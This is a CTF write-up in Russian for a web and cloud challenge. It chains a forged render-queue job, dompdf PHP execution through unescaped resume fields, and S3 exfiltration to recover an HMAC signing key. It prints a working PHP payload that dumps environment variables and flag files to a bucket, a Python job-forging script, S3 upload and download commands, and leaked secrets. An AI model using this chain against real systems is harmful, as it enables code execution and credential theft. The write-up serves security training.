# МёдХантер 3 — мастер-секрет подписи резюме (task21) — write-up

**Avito CTF 2026 · web / cloud (dompdf RCE → S3 exfil → recover HMAC signing key)**
**Цель:** достать главный секрет, которым подписываются PDF-резюме («Код проверки»), чтобы подделывать подпись любого документа.
**Сайт:** `https://hrportal-aoa51cvc.avitoctf.ru/`

> Третья, финальная задача «МёдХантер». Она стоит на плечах первых двух: **SSRF из task18** дал ключи S3 и путь к образам; **реверс из task19** дал ключ очереди `mhq_v1_…` и префикс `incoming/`. Здесь мы соединяем всё это: подделываем задание рендера → добиваемся RCE в PDF-воркере → сливаем `PDF_SIGNING_KEY` в бакет, который читаем ключами из task18.

## 1. Краткое условие

Каждый выпущенный PDF получает уникальный `ID документа` и `Код проверки` — по нему работодатель отличает настоящий документ от подделки. По условию (`task.md`) нужно **восстановить секрет подписи**, чтобы выпускать валидный код проверки для любого документа. Секрет оказался невычислимым из пар (id, code) и его пришлось **утечь через RCE** — а его значение и есть флаг.

## 2. Разведка

### Как устроена подпись (из реверса воркера)
PDF рендерит отдельный сервис — Yandex Cloud Function на PHP. Той же связкой SSRF→IMDSv1→IAM→`cr.yandex` (как в task19) вытащил образ `pdf-renderer` и распаковал его исходники в `task21/worker/` (`index.php`, `render.php`, `vendor/` с dompdf; сырой pull — `worker_get.out`).

Схема кода проверки — `worker/index.php:191`:

```php
$verificationCode = hash_hmac('sha256', $key, (string) $pdfSigningKey);
```

В PHP сигнатура `hash_hmac($algo, $data, $key)`, значит **data = `$key` (UUID документа), ключ HMAC = `$pdfSigningKey`**:

```
verification_code = HMAC_SHA256( key = PDF_SIGNING_KEY, msg = document_id )
```

### В системе ДВА разных секрета — их легко перепутать

| Секрет | Что подписывает | Откуда |
|--------|-----------------|--------|
| `RENDER_QUEUE_SIGNING_KEY` = `mhq_v1_4f8c2d9a…` | конверт задания очереди: `sig = HMAC(mhq, key + "." + payload)` | найден в бинаре бэкенда (task19) |
| `PDF_SIGNING_KEY` = `avito{…}` | **код проверки готового PDF** — это и есть цель | утекает в этом задании |

HMAC необратим, поэтому из пар (id, code) секрет не вычислить — его надо **утечь**. Зато наличие `mhq_v1_…` даёт право **самим ставить задания в очередь** — это точка входа для RCE.

## 3. Уязвимость (стек причин)

1. **dompdf с `isPhpEnabled = true`** (`worker/render.php:65`) — dompdf исполняет `<script type="text/php"> … </script>` прямо в процессе рендера. Это RCE, если мы контролируем HTML.
2. **Нет экранирования полей резюме.** `build_html()` вставляет `title/about/experience/skills/contact` в heredoc **сырыми** (`{$about}`, `{$experience}` без `htmlspecialchars`, `render.php:42-48`). Любое из этих полей = точка инъекции `<script type="text/php">`.
3. **S3-примитив записи в области видимости payload'а.** `index.php` в самом верху делает `require render.php`, а затем определяет глобальные `s3_request()` / `s3_presign_get()` (SigV4-клиент). PHP регистрирует top-level функции на этапе парсинга, поэтому в момент `render_pdf()` они уже **в области видимости** — наш PHP-код может вызвать `s3_request('PUT', …)` от имени воркера.
4. **Один общий бакет** для входящих заданий и «служебных» путей (`medhunter-resumes-6d6c314a`), ключи от которого утекли ещё в task18. Значит воркер может положить добычу туда, куда мы дотянемся своими ключами.
5. **Подписывающий ключ живёт в env процесса, который умеет исполнять код.** Даже стойкий HMAC-секрет бесполезен, если есть RCE в компоненте, который его знает.

## 4. Эксплуатация шаг за шагом

### Шаг 0 (важный, объясняет мотивацию) — доказать, что секрет НЕ в утёкшем `.env`
Сначала я собрал реальные пары (id, verification-code) с портально сгенерированных PDF (`pairs_sorted.txt`, 4 пары) и попробовал восстановить схему **на уже известных** секретах из task18 (`CALLBACK_SECRET`, `RECAPTCHA_SECRET`, `STORAGE_SECRET`) во всех разумных формах сообщения/конструкции — скрипты `verify_sig.py`, `solve_scheme.py`, `brute_sig.py`:

```python
# brute_sig.py — перебор форм msg × конструкций HMAC/SHA для КАЖДОЙ из 4 пар
# схема считается верной, только если совпала на ВСЕХ парах
SECRET = "DrnbU5tvwVtmSzR62wvB0e2KantvBOhWCwKaZLtW"  # это CALLBACK_SECRET, НЕ ключ подписи
```

**Ни одна** комбинация не сошлась на всех парах. Это и есть ключевой вывод: искомый ключ **не** совпадает ни с одним секретом из task18 → HMAC-подпись из пар не ломается → секрет надо **утечь** через выполнение кода. (Проверил постфактум: `CALLBACK_SECRET` действительно не воспроизводит ни одной пары.)

### Шаг 1 — подделать валидный конверт задания
Проверка подписи задания — `index.php:128`: `expected = hash_hmac('sha256', key . '.' . payload, queueSigningKey)`; ключ обязан матчить `mhq_v1_[0-9a-f]{32}`. `mhq_v1_…` у нас есть из task19 → собираем валидный конверт (`forge.py` — базовая проверка форжа):

```python
MHQ = "mhq_v1_4f8c2d9a7b6e1c3055aa93df0b8e7241"
key = str(uuid.uuid4())
payload_b64 = base64.b64encode(json.dumps(resume, separators=(",",":")).encode()).decode()
sig = hmac.new(MHQ.encode(), (key + "." + payload_b64).encode(), hashlib.sha256).hexdigest()
obj = {"key": key, "payload": payload_b64, "signature": sig}
```

### Шаг 2 — вложить PHP-payload в поле резюме
В поле `experience` кладём `<script type="text/php">…</script>`. Первый вариант (`exploit.py`) печатал секреты **прямо в PDF** (`$pdf->page_text(...)`) — но готовый PDF уходит в бакет результатов под **другими** кредами (`RESULTS_ACCESS_KEY`, которых у нас нет), значит прочитать его назад нельзя. Поэтому финальный вариант (`exploit2.py`) сливает добычу через S3-клиент воркера **в наш читаемый бакет**:

```php
<script type="text/php">
$d="";
foreach (getenv() as $k=>$v){ $d .= $k."=".$v."\n"; }
foreach (array("/function/flag","/function/flag.txt","flag.txt","/tmp/flag","/etc/flag") as $f){
  $c=@file_get_contents($f); if($c!==false){ $d .= "FILE:".$f."=".$c."\n"; } }
if (function_exists("s3_request")) {
  s3_request("PUT", getenv("STORAGE_ACCESS_KEY"), getenv("STORAGE_SECRET_KEY"),
             "medhunter-resumes-6d6c314a", "loot/dump-<uuid>.txt", $d, "text/plain"); }
</script>
```

Логика: используем `STORAGE_ACCESS_KEY`/`STORAGE_SECRET_KEY` **самого воркера** и пишем в `medhunter-resumes-6d6c314a` — тот же бакет, что мы уже читаем ключами из task18.

### Шаг 3 — триггернуть рендер
Рендер запускается по событию Object Storage на префикс **`incoming/`** (строку `incoming/` нашли в бинаре бэкенда в task19; PUT в корень бакета триггер не поднимает). Кладём подписанный конверт как `incoming/<uuid>.json` нашими ключами S3 (SigV4-клиент `s3put.py`):

```
python3 s3put.py put medhunter-resumes-6d6c314a incoming/<uuid>.json exploit2.json
```

Воркер по событию: `HEAD` (проверка размера ≤ 32 KB), `GET`, всегда `DELETE`, `decode_signed_job` (наша подпись валидна), затем `render_pdf` — где dompdf исполняет наш PHP.

### Шаг 4 — забрать добычу
PHP-payload положил `loot/dump-<uuid>.txt` (`exploit2_loot.txt` фиксирует путь). Читаем его нашими ключами (`s3.py`/`s3get.py`, `get`):

```
python3 s3.py get medhunter-resumes-6d6c314a loot/dump-25cb1a8a-1705-46d3-abfe-334fea44f50b.txt
```

В дампе — весь env воркера:

```
PDF_SIGNING_KEY=avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}   ← флаг = мастер-секрет
RENDER_QUEUE_SIGNING_KEY=mhq_v1_…            (тот самый ключ очереди из task19)
RESULTS_ACCESS_KEY / RESULTS_SECRET_KEY      (креды бакета результатов)
CALLBACK_URL / CALLBACK_SECRET               (внутренний callback бэкенда)
```

### Шаг 5 — криптографически подтвердить ключ
Восстановленным `PDF_SIGNING_KEY` пересчитал код проверки для всех 4 реальных пар по схеме из `index.php:191` (HMAC-ключ = секрет, сообщение = document_id):

```python
import hmac, hashlib
SECRET = "avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}"
vcode = lambda did: hmac.new(SECRET.encode(), did.encode(), hashlib.sha256).hexdigest()
# все 4 пары из pairs_sorted.txt совпали байт-в-байт → ключ верный
```

Все 4 совпали байт-в-байт (а `CALLBACK_SECRET` — ни одной). Значит секрет настоящий: можем выпустить валидный `Код проверки` для **любого** `document_id` → полная подделка подписи МёдХантера.

## 5. Флаг

```
avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}
```

Это **буквально значение `PDF_SIGNING_KEY`** — сам мастер-секрет и есть флаг.

## 6. Выводы / уроки

- **Стойкость HMAC не спасает, если секрет можно утечь.** Из пар (id, code) ключ не вычислить (шаг 0 это доказал перебором на всех известных секретах) — но RCE в компоненте, который его знает, обнуляет всю стойкость.
- **`isPhpEnabled=true` в dompdf для пользовательского HTML = RCE.** Никогда не включать исполнение PHP в рендерере недоверенного контента; экранировать все поля (`htmlspecialchars`).
- **Разделяйте секреты по процессам и бакетам.** Здесь один процесс держал в env и `PDF_SIGNING_KEY`, и ключи S3, и имел клиент записи в общий бакет — цепочка «исполнил код → прочитал env → записал в читаемый нами бакет» замкнулась мгновенно.
- **Провенанс всей цепочки:** `mhq_v1_…` (право ставить задание) — из реверса task19; ключи бакета для чтения добычи — из SSRF task18. Ни один шаг task21 не сработал бы без первых двух — это одна дыра (SSRF), раскрученная до полной компрометации подписи.

Файлы: `worker/index.php`, `worker/render.php` (реверс образа), `forge.py` (проверка форжа конверта), `exploit.py`/`exploit2.py` (PHP-payload + S3-эксфил), `s3.py`/`s3put.py`/`s3get.py` (SigV4-клиент), `pairs_sorted.txt` (пары для проверки), `verify_sig.py`/`solve_scheme.py`/`brute_sig.py` (провал перебора на утёкших секретах — мотивация RCE). Секреты (ключи S3, env-дамп) — только локально, в git не коммитятся.
